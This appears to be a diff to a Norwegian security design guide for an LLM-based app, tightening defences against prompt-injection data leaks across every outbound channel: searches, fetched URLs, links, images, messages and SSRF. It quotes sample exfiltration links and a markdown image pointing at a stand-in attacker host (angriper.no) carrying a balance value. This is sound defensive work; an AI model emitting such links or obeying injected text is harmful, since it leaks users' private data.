@@ -19,7 +19,9 @@ holdes i hodet:
    av brukerens to siste meldinger.
 
 Modellen velger da aldri på egen hånd hva som sendes ut etter at fremmed tekst er
-kommet inn, og den kan aldri legge data i en adresse.
+kommet inn, og den kan aldri legge data i en adresse. Det gjelder *hver* vei ut, også
+de som ikke ser ut som verktøy: en lenke i svaret, et bilde i markdown. Se «Hver vei
+ut» under.
 
 ## Regel 1: tur-smitte
 
@@ -32,7 +34,8 @@ verktøy, og den blir feil. Snu det:
 - Det som går ut av appen (et nettsøk, en sending, styring av noe fysisk) er bare lov
   **før noe er lest i turen**. Et søk kjører bare som turens første kall.
 - Er noe lest, avvises kallet med en grunn modellen kan handle på: «svar med det du
-  har, og spør om de vil at du søker; når de svarer, kan du søke».
+  har, og foreslå søket med den eksakte teksten; et ja til den teksten slipper
+  gjennom».
 
 **En ny brukermelding er ikke klarering i seg selv.** Sesjonen varer i dagevis, og det
 som ble lest i forrige tur, ligger fortsatt i konteksten sammen med de private dataene.
@@ -52,9 +55,11 @@ liggende, og der kan instruksen være gjentatt. Krev i tillegg minst én av diss
 - **Isoler planleggingen:** la det utgående innholdet lages av et eget modellkall som
   bare ser brukerens egne meldinger, ikke verktøyresultater eller tidligere svar.
 
-Det første er nok der handlingen ikke bærer fri tekst (styring innenfor en hvitliste);
-der innholdet er fri tekst (et søkespørsmål, en melding), trengs det andre eller det
-tredje.
+Det første er nok der handlingen ikke bærer fri tekst (styring innenfor en hvitliste),
+eller der mottakeren er brukeren selv, fast i koden (et dokument til brukerens eget
+brett). Der fri tekst går til noen andre (et søkespørsmål til søkeleverandøren, en
+melding), trengs det andre eller det tredje, eller at teksten står ordrett i brukerens
+melding.
 
 ## Regel 2: adresser bare fra brukeren
 
@@ -109,18 +114,56 @@ forsvarlig:
   `U+2066–U+206F`) og tag-tegnene `U+E0000–U+E007F`, som kan bære en skjult instruks.
 - Tak på teksten (20 000 tegn) og på bytene (se SSRF under).
 
-## Det som går ut i svaret
+## Hver vei ut
 
-En lenke i svaret er også en vei ut: `https://angriper.no/?d=<data>` lekker på ett
-trykk. Avgjør i klienten, som en ren funksjon, hvordan hver lenke fra modellen vises:
+En vei ut er alt som kan bære en verdi fra samtalen til noen andre enn brukerne:
+en adresse som hentes, et søk, en lenke som trykkes, et bilde som lastes, en melding
+som sendes, noe som skrives der andre ser det. Gå gjennom alle når en ny ferdighet
+kommer til. Felles for alle: **verdien eller mottakeren som går ut, må komme fra
+brukeren selv** — ordrett i brukerens egne meldinger, bekreftet eksakt etter et
+forslag, eller laget i et isolert kall som bare ser brukerens meldinger — eller være
+fast i koden.
+
+| Vei ut | Regel |
+| --- | --- |
+| Hente en adresse (serveren) | Bare en adresse som står ordrett i brukerens to siste meldinger (regel 2), bak SSRF-sperren |
+| Nettsøk | Søketeksten autorisert (avsnittet «Søket»), og bare som turens første kall |
+| Lenke i svaret | Klikkbar bare når den eksakte URL-en er autorisert av brukeren; ellers tekst til brukeren bekrefter (under) |
+| Bilde i svaret | Bare fra appens eget opphav med en fast sti; aldri en ekstern adresse (under) |
+| `mailto:`, `tel:`, `sms:` og andre skjema | Alltid ren tekst |
+| Sende noe (e-post, melding, dokument) | Mottakeren fast i koden eller ordrett fra brukeren. Fri tekst til en annen enn brukeren: forslag og ja med eksakt innhold og mottaker |
+| Skriving som når utenfor appens brukere | Som sending: en kalenderhendelse med gjester sender invitasjoner, et regneark kan være delt med andre |
+| Styre noe fysisk | Styringsverb i brukerens egen korte melding, hvitliste med grenser på verdiene, ikke etter lesing i turen (skriveverktoy.md punkt 9) |
+| Push-varsler | Mottakeren er brukerens egne enheter; URL-en i varselet settes av koden, aldri av modellteksten |
+| Logger og feilsporing hos tredjepart | Aldri modelltekst eller verktøyresultater; de kan inneholde både private data og fremmed tekst |
+
+### Lenker i svaret
+
+`https://angriper.no/?d=<saldo>` lekker på ett trykk, men det gjør også
+`https://angriper.no/12345` og `https://saldo-12345.angriper.no/`: en kort sti eller et
+underdomene bærer en verdi like godt som en query. Ingen sjekk av *formen* stopper det.
+Avgjør i klienten, som en ren funksjon, hvordan hver lenke fra modellen vises:
 
 - Interne lenker (`#/…`) som før.
 - Bare `http:` og `https:`; alt annet blir tekst.
-- Vis alltid det ekte vertsnavnet ved lenken, fra `new URL(href).hostname`, som gir
-  punycode (`xn--…`), så et kyrillisk navn ikke ligner det ekte.
-- Lenker med query, hash, port, brukernavn eller passord, eller en sti over ~60 tegn,
-  blir ren tekst med en kort merknad («lenke skjult: inneholdt ekstra data»). Sjekk
-  råteksten for `?` og `#` også: `URL` glemmer et tomt `?`.
+- **Klikkbar bare når den eksakte URL-en er autorisert:** den står, normalisert som i
+  regel 2, i en av brukerens egne meldinger i tråden. Serveren kan sende med lista over
+  autoriserte adresser, så klienten slipper å tolke tråden selv.
+- Alt annet vises som **ikke-klikkbar tekst**, hele adressen, med det ekte vertsnavnet
+  fra `new URL(href).hostname` (punycode, `xn--…`, så et kyrillisk navn ikke ligner det
+  ekte). Vil brukeren åpne den, viser et trykk hele adressen i et ark og åpner først
+  etter et ja. Da har brukeren sett nøyaktig hva som går ut.
+- Det gjelder også kildene fra et søk: de kom fra søkeleverandøren, ikke fra brukeren.
+  Vis dem med vertsnavn og bekreft før åpning.
+
+### Bilder i svaret
+
+Et bilde lastes uten at noen trykker, så `![](https://angriper.no/p.png?d=<saldo>)`
+lekker i det øyeblikket svaret tegnes. Bilder i modelltekst vises **bare fra appens eget
+opphav med en fast sti** (`/mini/<id>` med id-mønster sjekket i klienten), aldri fra
+en ekstern adresse, heller ikke `https://`. Samme vurdering for alt annet som kan få
+klienten eller serveren til å hente noe av seg selv: forhåndsvisning av lenker,
+stilark, skrifter, `<iframe>`. Modelltekst går aldri gjennom `innerHTML`.
 
 ## SSRF-sperren når serveren henter
 
@@ -166,5 +209,9 @@ innover nektes:
   biblioteket», brukeren svarer «ja», og søket med nøyaktig den teksten slipper
   gjennom. Et søk med en annen tekst etter samme ja blokkeres. Bruker appen et isolert
   kall i stedet, assert at konteksten det fikk bare inneholder brukerens meldinger.
+- **Lenker og bilder** som ren funksjon: `https://angriper.no/12345`,
+  `https://saldo-12345.angriper.no/` og en lenke med query blir tekst; den samme
+  adressen er klikkbar når den står i en brukermelding; `![](https://…)` tegnes aldri,
+  `![](/mini/<id>)` gjør det.
 - SSRF-sperren som rene funksjoner: én test per adresseform over, og et `lookup` som
   svarer offentlig første gang og privat andre gang.
